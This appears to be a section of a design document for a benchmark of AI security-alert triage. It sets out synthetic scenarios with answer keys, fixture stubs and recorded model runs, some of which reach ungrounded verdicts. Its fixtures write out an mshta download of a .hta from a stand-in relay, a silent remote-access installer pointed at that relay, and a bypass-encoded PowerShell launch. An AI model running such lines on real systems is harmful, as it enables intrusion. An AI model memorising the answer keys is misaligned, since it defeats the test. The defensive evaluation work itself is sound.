The techniques the alert declares are `T1114.003` and `T1078.004`, both already in the
packaged excerpt; no follow-on technique is expected of the investigation.

- Required findings, five, each cited from the hunting API or the SIEM, since both
  readings carry the same words, and held by the projection test. One per rule: the
  account, as UPN or name, and the destination, `ap.remittance@contoso-invoices.example`
  with `contoso-invoices.example` as the restatement a model writes when it names the
  domain rather than the address. Three findings rather than one for "three users", for
  the reason scenario 1 gave: a fact that names each mailbox with its destination has
  established the shared destination in a form the tokens can see, and "three" has too
  many spellings. The filter: the rules' words, and a rule word, one of `New-InboxRule`,
  `InboxRule`, `rule`, `rules`, `inbox rule`, `forwarding rule`. The words are one token
  whose first alternative is the whole parameter as every reading carries it,
  `invoice;IBAN;SWIFT;payment;remittance`, because Exchange joins the words with
  semicolons and under the whole-word rule that is one word; the other alternatives are
  the five words a model restates it with, so the fixture carries the token and a model
  that names any one term is credited. That is scenario 1's range precedent, in the file
  where a reviewer sees it. The common source: the address the rules were created from,
  and a rule word, which is what makes three rules one actor. The sign-ins are not a
  required finding: they explain how, the rules are what the verdict rests on, and the
  rule rows already carry the address.
- Stubs, all labelled `forwarding_rule`, keyed on the entities of the rows they return
  where the rows have one: the three users' sign-ins on any of their names, in the
  hunting API and the SIEM; their identities, one stub each; their related alerts on
  the UPN and on the incident; the address and the domain on VirusTotal; the runbook on
  the alert type, forwarding rules or business email compromise, the destination, or
  the adversary-in-the-middle entry's subject. One stub in each query tool is keyed more
  loosely than its rows would allow, and said so here as the tool layer asks: the audit
  stub matches an audit table with any of the three users, the destination, or an
  inbox-rule word such as `InboxRule` or `ForwardTo`, because "every inbox rule created
  in the tenant" is the question a model asks to learn whether other mailboxes were hit,
  and within this scenario's run its answer is these three rows. The cost within the run
  is the one stated under the tool layer: a listing of some other account's inbox rules
  gets three rows about three other accounts. What no stub carries, on purpose: the
  message trace of what was forwarded, and the phishing message or URL click that
  preceded the sign-ins. Both are the expected missing context, and a model that asks
  gets `no_fixture`, which is the harness saying it does not hold the answer. Scenario
  2's gap test asked the runbook about forwarding invoices and the audit tables about
  inbox rules as subjects no scenario held; both are this scenario's now, so those two
  assertions are made under scenario 2's own binding, the weaker claim, and the
  every-label assertions moved to subjects still absent. Fourteen stubs carry the
  label: two hunting queries, two SIEM searches, three identities, four related-alert
  pivots, two indicators, one runbook entry.
- Expected missing context, two: what was forwarded through the rules before they were
  found, the message trace, which no fixture carries; and how the sessions were
  obtained, the phishing message or the click, which no fixture carries.
- The scripted cell is a plumbing check: every call the script makes hits a stub, so the
  tool calls block shows no `no_fixture`, and the evidence recall is zero because the
  script states no fact in the findings' words. Six real runs on 2026-09-15 in the first
  campaign: three refused by the provider before any turn, three completed with the
  verdict right at evidence recall 1, 2 and 1 of 5 and no `no_fixture` call; the
  demonstration run is kept under `runs/forwarding_rule/campaign-3/`.

### Scenario 4, encoded PowerShell

Checked against the table under "Scenarios". The signal is `powershell.exe` launched
with an encoded command on a production server: true. The assertion is that an
obfuscated command was executed on the server, at the granularity of T1059.001 and
T1027.010. It is true: the command line carries `-EncodedCommand` and a base64 payload,
and it ran. Intent decides: the parent is `cfgagent.exe`, the group's configuration
management agent, from its installed path, as SYSTEM, inside a maintenance window
declared on a change ticket for that server, and the runbook says that is how the agent
applies state. The assertion is true and the intent is authorised. Label
`benign_true_positive`, no escalation. The action the table names for it, document an
exception on the triplet and do not disable the rule, belongs to `recommended_action`
and the verdict does not carry it. The triplet, decided here because the table names it
without saying: the device, the parent image path and the account. It is what the
runbook entry documents an exception on, and what an encoded command from any other
parent, any other path or any other account falls outside of.

The story, all synthetic. `srv-prd-app01.contoso.com` is a critical production server in
the PCI zone owned by platform-ops, the asset the fixtures have carried since slice 2.
At 02:47:12 UTC on 2026-09-14, `cfgagent.exe`, installed under `C:\Program
Files\Contoso\ConfigAgent`, running as SYSTEM under the `ContosoConfigAgent` service and
signed by the bank's internal code-signing CA, launched `powershell.exe -NoProfile
-NonInteractive -ExecutionPolicy Bypass -EncodedCommand ...`. Decoded, the payload sets
the recycling time of the PaymentsApi IIS application pool and restarts it, the drift
correction that change ticket CHG0042117 declares: standard change, approved, window
02:00 to 04:00 UTC that day. The same rule fired on the same server on 2026-08-31 in
the previous window and was resolved as expected activity, an exception nobody
documented, which is why it fired again. VirusTotal has never seen the agent's hash,
which is a reading, and knows `powershell.exe` as Microsoft's, a reading that does not
depend on who asks and is therefore `shared`. The techniques the alert declares are
`T1059.001`, already in the excerpt, and `T1027.010`, added to the packaged excerpt,
cut verbatim from the same cached bundle on the same day and recorded in
`tests/recorded/README.md`.

- Required findings, four. The execution: the device, as FQDN, short name or upper
  case, one of `EncodedCommand` and `encoded`, and one of `powershell.exe` and
  `PowerShell`, cited from the hunting API, the SIEM or the process tree, since all
  three readings carry those words. The parent: `cfgagent.exe` and `powershell.exe` in
  one statement, from the same three tools; a fact that names both names the
  relationship. Neither `parent` nor `initiating` is a token, because the tabular
  readings carry them only inside column names, `InitiatingProcessFileName` and
  `parent_process_name`, which under the whole-word rule are not those words. The
  sanction: `cfgagent.exe` and one of the runbook's words for what it is, cited from
  the runbook alone, since only the runbook says the agent is the agent. The window:
  `CHG0042117` or the window's opening hour, and one of `maintenance`, `window`,
  `change`, cited from the runbook or from the SIEM's change calendar, both of which
  carry the ticket. The account is not a required finding: it is the triplet's third
  element and matters to the exception, and the verdict rests on the parent and the
  window. The projection test builds the process tree's request from the stub's first
  row, device and process id, because the tree pivots on a request and the other
  projections do not.
- Stubs, all labelled `encoded_powershell` except one. The asset stub for
  `srv-prd-app01`, labelled `test` since slice 2, is the server's and is relabelled; it
  gains the server's address as a spelling. The `DeviceEvents` stub labelled `test`, an
  antivirus detection on no device that existed for the redaction test, is rewritten as
  the server's `DeviceEvents` reading, keyed on the device, whose `PowerShellCommand`
  rows carry the decoded commands in `AdditionalFields`, the column the projection
  drops, so the redaction test keeps its case on a stub that serves a scenario. The
  rest: `DeviceProcessEvents` on the device, the process tree on the device with any
  process id, the SIEM's process events and its change calendar on the device or the
  ticket, the owner's identity, related alerts on the device and on the incident, the
  agent's hash, and the runbook on the alert type, the server, the agent, the ticket or
  the maintenance window. The change calendar stub precedes the process stub in file
  order and requires a change word, so a process search that mentions the window still
  gets process rows only when it names none of them; that is the within-scenario
  looseness, stated. What remains `test` after this: the process tree of `ws-fin-0042`,
  which is scenario 7's workstation, serves the lineage and command-line redaction
  tests, and is relabelled when scenario 7 arrives. Eleven stubs carry the label and
  one, `powershell.exe` on VirusTotal, is `shared`.
- Expected missing context, two: what the encoded command does, decoded, which no view
  carries in clear, since `AdditionalFields` is dropped and the process tree carries
  the encoded form; and the agent's own record of the run, the job that tied this
  execution to the ticket, which no tool reaches.
- The scripted cell is a plumbing check on the same terms as scenario 3's. Six real
  runs on 2026-09-15 in the first campaign: three refused by the provider before any
  turn, three completed with the verdict right at evidence recall 2, 1 and 0 of 4, two
  tool calls each and no `no_fixture` call; the demonstration run is kept under
  `runs/encoded_powershell/campaign-3/`.

### Scenario 5, LSASS access blocked

Checked against the table under "Scenarios". The signal is a process that opened LSASS
with read access and was blocked: what the rule's logic measured, and true. The
assertion is that a process attempted to read credentials from LSASS memory, at the
granularity of T1003.001. It is true: the attempt was made and the attack surface
reduction rule prevented it. Intent decides between `true_positive` and
`benign_true_positive`, as it did for scenario 4, because the assertion is true: the read
was attempted by `svc-purpleops`, an account on the exercise list, from `ws-eng-0148`, a
host on the exercise list, inside the declared window of the purple team exercise
`PT-2026-0914`, and the runbook says credential-access techniques against LSASS are in
scope for it. The assertion is true and the intent is authorised. Label
`benign_true_positive`, no escalation. Five is scenario 4's shape on the credential-access
axis: the technique the rule names did occur, an LSASS read was attempted, and intent
decides, exactly as encoded PowerShell did run and intent decided there. It is not
scenario 6, where the technique the rule names did not occur. The action the table names,
confirm the block held and the prevention worked, belongs to `recommended_action`, and no
verdict definition carries an action.

- Required findings, four. The access: the device, one of `lsass` or `lsass.exe`, and
  one of `rt-cred.exe` or `rt-cred`, cited from the hunting API or the SIEM, since both
  readings carry those words. The block: one of `lsass`, `LSASS` or `credential`, and one
  of `blocked`, `prevented` or `denied`, cited from the SIEM alone. Checked against the
  fixtures under whole-word matching: the Defender `DeviceEvents` reading names the
  event through `ActionType`, whose value `AsrLsassCredentialTheftBlocked` is one word the
  whole-word rule cannot split into `blocked`, so the hunting view carries the access but
  not the outcome as a citable word; the CIM-normalised SIEM carries the block as
  `action` `blocked` and a `signature` that says LSASS credential theft was blocked, so
  the block is carried by the SIEM alone, the way scenario 1's gateway is carried by the
  runbook alone. The sanction and the exercise list: one of `svc-purpleops` or
  `purpleops`, and one of the runbook's words for authorisation, `exercise`, `authorised`,
  `expected`, `sanctioned`, `scope`, `list`, cited from the runbook alone, since only the
  runbook says the account is on the exercise list. The window: `PT-2026-0914`, and one of
  `window`, `exercise`, `maintenance`, `scheduled`, cited from the runbook or the SIEM's
  exercise calendar, both of which name the exercise.
- Scenario 5 does not claim the `ws-fin-0042` process tree stub, which stays `test`. That
  stub is an `outlook.exe` to `mshta.exe` to `powershell.exe` and `RemoteSupport` lineage,
  scenario 7's initial-access chain on a finance workstation; it is not an LSASS read on a
  red team target and it names neither `ws-eng-0148` nor `svc-purpleops`, so it does not
  fit and is not relabelled. Scenario 5's LSASS access is an `OpenProcess`-style API call,
  not a spawned child, so its evidence is a `DeviceEvents` block row and the SIEM, and
  `get_process_tree` carries no scenario 5 stub. The `ws-fin-0042` tree remains the one
  `test` stub, relabelled when scenario 7 arrives.
- Stubs, all labelled `lsass_access`, keyed on the entities of the rows they return: the
  device's LSASS block on the device, in the hunting API and the SIEM; the operator's
  sign-ins on `svc-purpleops`; the operator's identity on `svc-purpleops`; the device's
  asset record on the device; the red team tool's hash on VirusTotal, which has never
  seen it; the prior exercise alert on the operator's UPN and on the incident; the SIEM's
  exercise calendar on the exercise or the device; and the runbook on the alert type, the
  exercise, the account, the device or T1003. The `DeviceEvents` block stub is keyed on
  the device, which is the principal entity of its rows, so a block query about another
  device is a `no_fixture` error. `AdditionalFields` on the block row carries the desired
  access mask and is dropped by the projection, the way scenario 4's decoded commands are.
- **The runbook gap, found on the first campaign.** Six runs, three refused by the
  provider before any turn. The three served all opened by asking the runbook, and
  seven of their calls were refused: `purpleops`, `PurpleOps` and `rt-cred` in one run,
  `purpleops` and `PurpleOps` in another, `PurpleOps` and `purple` in the third. The
  stub keyed on `svc-purpleops` and `ws-eng-0148` as the alert spells them, on the
  exercise's identifier and on its kind; none of those is what a model types when it
  reads the account's stem and the folder `C:\ProgramData\PurpleOps`, and none is the
  tool. So the stub now also names the programme, `purple`, which covers the stem, the
  folder and the exercise's kind, and the tool, `rt-cred`; both are proper names of
  this scenario, neither is a table or an action word, and no other alert or recording
  carries them. The seven requests are replayed from the three committed recordings in
  a test. What the gap did to the numbers: the one completed run, under
  `runs/lsass_access/campaign-4/`, reached none of the four findings. Two rest on the
  runbook it was refused three times. The other two rest on the hunting API and the
  SIEM, which it never queried: its three facts cite the identity, the asset and the
  related alerts, all correct and none a required finding. So 0 of 4 is a floor of two
  halves, one the fixture's and one the model's, and the trace separates them.
- Expected missing context, two: whether any credential material was returned before the
  block, which no view carries because the block's result payload is not projected, and
  which is why confirming the prevention worked is the recommended action rather than a
  fact; and the exercise's rules of engagement, the authorisation record that scopes this
  specific action, which no tool reaches.
- The techniques the alert declares are `T1003.001` alone, already in the packaged
  excerpt, so the excerpt gains nothing and `tests/recorded/README.md` is unchanged. No
  follow-on technique is expected of the investigation.
- The scripted cell is a plumbing check on the same terms as scenario 3's. The six
  real runs of 2026-09-15 are read in the runbook gap above, and three of them are kept
  under `runs/lsass_access/`.

### Scenario 6, apparent Kerberoasting

Checked against the table under "Scenarios". The signal is one account requesting service
tickets for 180 service principal names in 90 seconds: what the rule's logic measured, and
true. The assertion is that service tickets were harvested to crack service-account
passwords offline, at the granularity of T1558.003. It is false: the account is
`svc-vulnscan`, the credentialed vulnerability scanner, which obtains service tickets to
authenticate to the services it scans; the tickets were AES256, not the RC4 downgrade
Kerberoasting relies on, and nothing was harvested for cracking. The technique the rule is
named for did not occur, so the assertion is false and intent does not enter. Label
`false_positive`, no escalation. Six is the shape of eight: a sanctioned actor produced
the exact volume the rule measures without performing the technique the rule is named for.
They part on the action axis, not the truth axis. The spec's action for six, requalify
this as a tuning exclusion for the scanner's account rather than close it again, belongs to
`recommended_action`; the verdict is `false_positive`, and the finding that the runbook
prescribes the exclusion is an observed fact about the runbook, not the verdict.

- Required findings, three. The scale: `180`, one of `SPN`, `service ticket`,
  `service tickets`, `Kerberos` or `4769`, and one of `svc-vulnscan` or `vulnscan`, cited
  from the SIEM alone. Checked against the fixtures under whole-word matching: in Defender
  hunting the service name and the ticket options sit in `AdditionalFields`, which the
  projection drops, so the hunting view shows that service tickets were requested but not
  the distinct count of service names; the CIM-normalised SIEM exposes the service as the
  allowlisted `object` field, so `dc(object)` reads `180` in the view and the SIEM carries
  the scale, the way scenario 5's block is carried by the SIEM alone. The identity: one of
  `svc-vulnscan`, `vulnscan` or `scanner`, and one of `scanner` or `vulnerability`, cited
  from `get_identity` or the runbook, since the identity's business unit is Vulnerability
  Management and its category is scanner, and the runbook names the scanner. The
  requalification: one of `svc-vulnscan` or `scanner`, and one of `exclude`, `exclusion`,
  `tune`, `tuning`, `requalify`, `expected` or `known`, cited from the runbook alone, since
  only the runbook prescribes the tuning.
- **How the scanner's account is kept from the wrong account, and the limit of it.** The
  aggregate that reads 180 is about one account, unlike scenario 2's tenant-wide spray
  aggregate, which is about 137 accounts with no entity to key on. So scenario 6 keys its
  Kerberos stubs on the scanner: the match requires both a Kerberos or service-ticket term
  and `svc-vulnscan`. A Kerberos query that names a different account and not the scanner
  therefore falls through to a `no_fixture` error, which is the case this matters for: a
  fact about another account's ticket requests inside scenario 6's run would be grounded
  and wrong, and the entity key stops it. What the entity key cannot do is honour the role
  the account name plays in the query. A regex matcher is a substring test over the query
  text; it cannot parse KQL or SPL. It can require that `svc-vulnscan` appear somewhere in
  the query, which excludes a query that names only another account, but it cannot tell an
  inclusion filter from an exclusion filter, so a query such as
  `SecurityEvent | where EventID == 4769 | where Account != "svc-vulnscan"` still matches
  and is answered with the scanner's rows. This is the within-scenario looseness the tool
  layer describes, and it is stated here beside the rule rather than implied away: a regex
  matcher cannot honour a filter, only the presence of a token. The run-time binding
  confines the looseness to scenario 6's own run; within that run, a query that both names
  the scanner and asks about another account gets the scanner's rows. The entity-rule test
  asserts both halves: a Kerberos query naming only another account is `no_fixture`, and
  the exclusion query above still returns the scanner's rows, so the limit is on record.
- Stubs, all labelled `kerberoasting`. Keyed on the scanner or on the scanner's host: the
  scanner's sign-ins on `svc-vulnscan`, in the hunting API and the SIEM; the ticket-request
  detail and, in the SIEM, the distinct-service-name aggregate, both keyed on the scanner
  and a Kerberos term, with the aggregate stub before the detail stub in file order so a
  `stats` query reads the count; the scanner's identity on `svc-vulnscan`; the scanner
  host's asset record on `scan-ops-01`; the prior Kerberoasting alerts closed as false
  positives on the scanner's UPN and on the incident; and the runbook on the alert type,
  the scanner, the host or T1558. The alert carries no external indicator, so there is no
  `lookup_ioc` stub; a lookup of the scanner's internal address is a `no_fixture` error,
  which is honest, since VirusTotal has no useful reading of a private address.
- Expected missing context, two: whether the requested tickets were followed by
  authentication to the services, the correlation that separates a scanner from a harvester,
  which no tool provides; and the scanner's own scan record, the job that ties this burst to
  a scheduled scan, which no tool reaches.
- The techniques the alert declares are `T1558.003` alone, already in the packaged excerpt,
  so the excerpt gains nothing and `tests/recorded/README.md` is unchanged. No follow-on
  technique is expected of the investigation.
- The scripted cell is a plumbing check on the same terms as scenario 3's. Seven real
  runs on 2026-09-15 in the first campaign: three refused by the provider before any
  turn, four completed with the verdict right at evidence recall 2, 2, 1 and 1 of 3,
  three tool calls each and no `no_fixture` call; the demonstration run is kept under
  `runs/kerberoasting/campaign-0/`.

### Scenario 7, the trap: an RMM tool blocked by the EDR

Checked against the table under "Scenarios". The signal is the EDR blocking a signed
remote-management binary with a clean reputation: what the rule's logic measured, and
true. The assertion is that a remote-management tool was executed on the endpoint, at
the granularity of T1219 and of the device it names. It is true: the block caught the
second execution, and the first ran. At 08:41:10 UTC on 2026-09-14 `outlook.exe` on
`ws-fin-0042` launched `mshta.exe https://relay.example.net/invoice.hta`; at 08:41:12
mshta launched an encoded PowerShell, and at 08:41:15 it launched
`RemoteSupport.ClientSetup.exe /silent /relay=relay.example.net`, which ran; at 08:47:16,
six minutes after mshta, the installed `RemoteSupport.Agent.exe` started and Defender
Antivirus blocked it as a potentially unwanted application. Intent decides between
`true_positive` and `benign_true_positive`, and nothing here is authorised: the group's IT
provider does run RemoteSupport, deployed by Intune to the provider's relay
`rmm.contoso-itsupport.example`, and this install arrived from a user's Temp folder,
by script, from a mail client, to a relay registered twelve days earlier. Label
`true_positive`, escalation expected. Seven is the mirror of one, as the table says: a
signature and a clean reputation make the assertion no less true, the way a gateway's
geo-IP made the travel no more real.

The story, all synthetic. `pnovak@contoso.com` is a Trade Finance identity of high
priority on the finance workstation `ws-fin-0042.contoso.com`. The chain is the process
tree the fixtures have carried since slice 2 under the label `test`, which was written
as this scenario's chain and is now claimed: `explorer.exe` to `outlook.exe` to
`mshta.exe` to the encoded PowerShell and the installer, with the installer's command
line carrying the relay and a password the generic redaction removes. The tree gains the
agent's row, launched by the installer at 08:47:16 and blocked. VirusTotal knows the agent
and the installer as signed by RemoteSupport Software Ltd with nothing flagged out of 72
engines, the relay domain as created on 2026-09-02 with two engines flagging it, and the
`.hta` URL with two flagging it as phishing; the reputation on every one is zero, which
the projection reads as nobody having voted, not as clean. Defender raised an
informational alert on the mshta launch six minutes before this one, in the same incident,
and the related-alerts pivot on the user, the device or the incident finds it. The
techniques the alert declares are `T1219` alone; `T1218.005`, mshta, is the follow-on
technique the investigation resolves, already in the packaged excerpt, so
`tests/recorded/README.md` gains a sentence and no object.

- Required findings, four, and this scenario spans more tools than any other, so each is
  stated with the tool it rests on and the check against the reading, under whole-word
  matching. **The block:** the device, `RemoteSupport.Agent.exe` or `RemoteSupport`, and
  one of `blocked`, `prevented`, `denied`, `quarantined`, cited from the SIEM alone. The
  hunting `DeviceEvents` row names the event through `ActionType` `AntivirusDetection` and
  keeps the outcome in `AdditionalFields`, which the projection drops, so the hunting view
  carries the detection but not the block as a word; the CIM-normalised SIEM carries
  `action` `blocked` and a signature that says the application was blocked, the way
  scenario 5's block is carried by the SIEM alone. **Mshta from the mail client:**
  `mshta.exe` or `mshta`, and one of `outlook.exe`, `outlook`, `OUTLOOK.EXE`, cited from
  the process tree, the hunting API or the SIEM, since all three readings carry both
  names: the tree as parent and self, the hunting row as `FileName` and
  `InitiatingProcessFileName`, the SIEM as `process_name` and `parent_process_name`. **The
  installer, launched by mshta, naming the relay:** `RemoteSupport.ClientSetup.exe` or
  `ClientSetup`, `mshta.exe` or `mshta`, and the relay, from the same three tools. The
  relay token is the scenario 3 precedent: every reading carries it inside the command
  line as `/relay=relay.example.net`, which under the whole-word rule is one word
  `relay=relay.example.net` once the leading slash is stripped, so that spelling is the
  first alternative and `relay.example.net` the restatement a model writes. **The
  provider's relay:** `rmm.contoso-itsupport.example` and one of `provider`, `IT
  provider`, `service desk`, `Intune`, `approved`, `sanctioned`, cited from the runbook
  alone, since only the runbook says what the provider's relay is. A fact that names both
  relays would have established the mismatch in one sentence, and it cannot be a finding,
  because no single reading carries both names; two findings that each name one are what
  the tokens can see, which is scenario 1's reason for two sign-in findings.
- **VirusTotal carries no finding, on purpose.** The clean reading of the agent, signed,
  0 of 72, is the reading a token could be fitted to: it carries `RemoteSupport` and
  `signed` as whole words, and a fact that copied it would look like the block finding
  minus the block. No finding lists `lookup_ioc`, and since a finding is matched by tool
  before tokens, a fact citing VirusTotal can carry none of the four whatever it says.
  The domain's age and the URL's two flags are supporting readings a good investigation
  cites and the verdict does not rest on; the verdict rests on the chain and on the
  relay, which are the same whether or not any engine has an opinion.
- Stubs, all labelled `rmm_block`, keyed on the entities of the rows they return: the
  process tree on the device with any process id, since a model pivots on the alert's
  process, the installer or mshta and the same rows answer all three; the device's
  process events and its antivirus detection in the hunting API, on the device or the
  account, since the rows hold both; the device's endpoint events in the SIEM, one stub
  holding the four process rows and the block, on the device or the account; the user's
  sign-ins in both tools; the user's identity; the device's asset record; the related
  alerts on the user, the device and the incident; the agent's hash, the installer's
  hash, the relay domain and the `.hta` URL on VirusTotal; and the runbook on the alert
  type, the product, `RMM`, either relay, mshta, the `.hta` extension, the device, the
  user or the techniques. The `mshta.exe` hash is `shared`, a Microsoft binary whose
  reading does not depend on who asks. What no stub carries, on purpose: the network
  telemetry that would say whether the first agent reached the relay, and the mail that
  delivered the `.hta`. Both are the expected missing context, and a model asking
  `DeviceNetworkEvents` or `EmailEvents` gets `no_fixture`, which is the harness saying it
  does not hold the answer. Sixteen stubs carry the label and one is `shared`.
- **Nothing is left labelled `test`.** The workstation tree was the last, and it was
  always this scenario's. The suite's tests of the `test` label build the stub they need
  in a temporary fixture directory, which is the right place for a stub that serves no
  scenario.
- Expected missing context, two: the mail that delivered `invoice.hta`, the message trace
  or the click, which no fixture carries; and whether the first agent established a session
  to the relay before the block, the network telemetry, which no fixture carries.
- The scripted cell is a plumbing check on the same terms as scenario 3's.
- **The one real run, and what it asked: nothing.** Step 2 of "One real run before a
  cell is paid for" was made on 2026-09-15 at 12:25 UTC by
  `google_genai:gemini-3.5-flash-lite` under `analyst`, on the fixtures of commit
  6e4ff06, as run directory 0 of the results directory, and it is kept under
  `runs/rmm_block/campaign-0/`. It closed in 2.35 seconds with zero tool calls. The
  model read the alert, asked nothing of any tool, and answered `benign_true_positive`
  at confidence 0.8 with no observed fact, one assumption, that pnovak ran the setup
  tool for legitimate support purposes, one missing-context entry, the helpdesk ticket
  that would confirm it, and no escalation; it never proposed. That is the tier-one
  reflex this scenario is written for, in 2.35 seconds rather than ninety: a signed
  binary and a clean reputation read as authorised use, with no evidence sought, on
  the alert whose truth is initial access. The silence rule refused it: no observed
  fact and a verdict that is not `inconclusive` is ungrounded. The correction pass had
  no offending fact to repair and no citable call to offer, returned no repairs, and
  the result was validated again as it stood, so the run is `failed_ungrounded`:
  verdict wrong, evidence recall 0 of 4, missing context 0 of 2, the expected
  escalation missed. What it did to the gate: a run that asks no question opens no gap
  and closes none, so step 3 had nothing to read, and step 2 is not met by it. The
  rule is that a scenario is not measured until a real model has asked it questions
  once and the author has read them; this one asked none, so no stub of this scenario
  has met a model's question yet, and no cell is paid for until a real run has asked
  at least one. The recording is committed because this section cites it, under the
  contract in "Using it" for a served run that holds no tool call.

### Scenario 8, the reverse trap: 6.2 GB to personal cloud storage by a leaver

Checked against the table under "Scenarios", and the label is not re-litigated here: the
table moved it once, with its reason, and this section applies that reason. The signal is
6.2 GB uploaded to a personal cloud storage domain by a user on the leaver watchlist: what
the rule's logic measured, and true. The assertion is that organisational data was moved
out to personal storage by a departing employee, at the granularity of T1567.002. It is
false: the 2 340 files are 94 percent image content by the CASB's breakdown, none carries
a sensitivity label, none came from a SharePoint site, a file share or a labelled
location, and the source folder is the user's own camera roll. The technique the rule is
named for, exfiltration, did not occur, because exfiltration is organisational data
leaving and none did; so the assertion is false and intent does not enter. Label
`false_positive`, no escalation. The rule is not tuned, because it did exactly its job
and the next leaver's 6.2 GB may be source code; the finding is routed to HR as personal
use of a corporate device. Both of those are `recommended_action`, and no verdict
definition carries an action. Eight is the shape of six, parting from it on the action
axis: six tunes permanently, eight tunes nothing.

The story, all synthetic. `dlarsen@contoso.com` is a Marketing identity who resigned
with an end date of 2026-09-30 and is on the leaver watchlist, on the workstation
`ws-mkt-0117.contoso.com`. Between 09:12 and 11:38 UTC on 2026-09-14 the browser on that
workstation uploaded 2 340 files, 6 657 199 308 bytes, to `upload.photodrive.example`,
the upload endpoint of PhotoDrive, a consumer photo storage service the proxy
categorises as personal cloud storage and the tenant does not sanction. Defender for
Cloud Apps had noted the app's use three days earlier as an informational alert. The
CASB's content breakdown reads image content 94 percent, JPEG 71 and HEIC 23, video 4,
PDF 1, other 1; sensitivity labels none; source folder the user's Pictures. The
techniques the alert declares are `T1567.002` alone, already in the packaged excerpt.

- Required findings, five. **The volume and the destination:** the user, as UPN or name,
  the volume, and the app, cited from the hunting API or the SIEM. The volume token is
  the scenario 3 precedent again: the readings carry the byte count `6657199308`, in the
  hunting aggregate as `sum_FileSize` and in the SIEM as `sum(bytes_out)`, so that is the
  first alternative and `6.2 GB` the restatement a model writes after the arithmetic. The
  app is `PhotoDrive` or the domain. **The content is photographs:** `94` and one of
  `image`, `images`, `photo`, `photos`, `photograph`, `photographs`, `picture`,
  `pictures`, `JPEG`, cited from the SIEM alone, since the breakdown is the CASB's and
  the hunting rows carry file names and sizes, not a percentage; the SIEM's `object_attrs`
  reads `image content types 94%`, and `94%` is the word `94` under the whole-word rule
  once the trailing sign is stripped. **No label and no corporate source:** one of
  `sensitivity`, `label`, `labels`, `labelled`, `labeled`, `classification`, `classified`,
  and one of `none`, `no`, `not`, `without`, `zero`, `unlabelled`, `unlabeled`, cited from
  the SIEM alone, whose `object_attrs` reads `sensitivity labels: none` and `SharePoint
  or OneDrive origin: none`. **The user is a leaver:** the user and one of `leaver`,
  `leavers`, `resigned`, `resignation`, `departing`, `leaving`, `watchlist`,
  `2026-09-30`, cited from the identity alone, whose view carries the category
  `leaver`, the watchlist flag and the end date. **The runbook routes personal use to
  HR:** `HR` or `human resources`, and `personal use` or `personal`, cited from the
  runbook alone, since only the runbook prescribes the routing; this is scenario 6's
  requalification finding, an observed fact about the runbook and not the verdict.
  VirusTotal's clean reading of the storage domain carries no finding and is listed on
  none, for scenario 7's reason.
- Stubs, all labelled `cloud_upload`, keyed on the entities of the rows they return: the
  user's cloud-app activity in the hunting API, an aggregate stub before a detail stub in
  file order so a `summarize` query reads the count and the byte sum, both on the user;
  the workstation's network events to the storage domain on the device; the user's
  sign-ins in both tools; the CASB reading in the SIEM on the user or the domain; the
  user's identity; the workstation's asset record; the related alerts on the user and on
  the incident; the storage domain and its parent on VirusTotal; and the runbook on the
  alert type, the leaver watchlist, the app, the domain, the user, the device or the
  technique. Thirteen stubs carry the label. What no stub carries, on purpose: a hash or
  fingerprint match of the uploaded files against corporate locations, and anything
  about the six percent that is not an image beyond the percentage, which are the
  expected missing context.
- Expected missing context, two: the names and origin of the non-image files, the PDF
  and the other one percent, which the reading gives only as a percentage and which is
  where a document would hide; and the HR record or the user's own account of the
  upload, the confirmation that the photographs are personal, which no tool reaches.
- The scripted cell is a plumbing check on the same terms as scenario 3's.
- **The one real run, and what it asked: one question, answered.** Step 2 was made on
  2026-09-15 at 12:26 UTC by `google_genai:gemini-3.5-flash-lite` under `analyst`, on
  the fixtures of commit 6e4ff06, as run directory 0 of the results directory, one
  minute after scenario 7's, and it is kept under `runs/cloud_upload/campaign-0/` as
  the scenario's demonstration run, the first completed real run on the scenario by
  rule. It completed in 6.50 seconds with three tool calls: a hunting query for
  dlarsen's `CloudAppEvents`, which the hunting fixture answered with the file rows;
  the ATT&CK lookup of T1567.002, live; and the proposal, accepted. It never queried
  the SIEM, the identity or the runbook, so the 94 percent, the absent labels, the
  leaver status and the HR routing were never in front of it. Its first pass cited
  `default_api:search_events` and `default_api:get_attack_technique`, the tool names
  under the client's own prefix rather than the call ids; the validator refused all
  three citations as `unknown_id`, the repair instruction offered the two citable
  calls, and the second pass re-cited each fact onto the right one, which is the loop
  doing the one thing it is for. Verdict `benign_true_positive` at confidence 0.95
  against `false_positive`: "a personal photo backup by a watchlisted user", the alert
  read at the level of the signal, which is the reading the table under "Scenarios"
  moved this label away from, now seen on a real model. Evidence recall 0 of 5: two
  facts cite the hunting rows and name the user, PhotoDrive and the JPEG and HEIC
  types, and neither says the byte count, 6.2 GB or the file count, so the volume
  finding missed on its volume token; the other four findings rest on tools it never
  called. Missing context 0 of 2: it named nothing. Escalation correct. What it did to
  the gate: one question was asked and a stub answered it, there is no `no_fixture` to
  decide, so step 3 read nothing and closed nothing, and every miss is the model's, for
  not asking. Step 4 is the recording; the cell may be paid for, and the recall it
  produces is read as a floor as before, with this run saying that the floor owes
  nothing to the fixture.

## Cost discipline

The build runs entirely against the scripted client, so development costs nothing.
Before the comparison matrix, one cell is measured on real usage and the full cost
extrapolated. Prompt caching applies since fixtures and tool definitions are constant.
Where the budget does not carry the intended number of runs, the run is smaller and the
report says so, with the wider intervals visible.

All fixtures are synthetic, so no confidential data is involved at any point.

## Scope and limits

Stated up front, because a careful reader will find them.

- Read-only by design, with one gated proposal that writes nothing. This triages; it
  does not remediate.
- Two connectors are live, seven are fixture-backed. `lookup_ioc` talks to VirusTotal
  and `get_attack_technique` reads the public ATT&CK bundle. The other seven follow the
  real API shapes and document their live contract, so a tenant owner ports them rather
  than rewrites them, but nothing here talks to a production SIEM or EDR out of the box.
  The README says which is which, per tool.
- Eight scenarios and a finite taxonomy. Real alert queues are messier, noisier and
  ambiguous.
- Single tenant, single language, no fine-tuning.
